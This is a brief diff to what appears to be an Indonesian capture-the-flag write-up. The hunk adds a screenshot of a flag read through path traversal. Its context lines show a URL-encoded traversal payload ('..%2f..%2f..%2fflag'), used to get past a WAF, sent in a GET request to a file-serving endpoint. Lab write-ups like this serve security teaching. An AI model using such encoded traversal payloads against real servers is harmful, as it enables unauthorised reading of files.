@@ -250,6 +250,8 @@ Pake payload `..%2f..%2f..%2fflag` karna `../../../flag` kena WAF, jadi coba enc
 GET /provider/statement?file=..%2f..%2f..%2fflag
 ```
 
+![Flag terbaca lewat path traversal](bmn/img/20-flag.png)
+
 ---
 
 ### 🚩 Flag
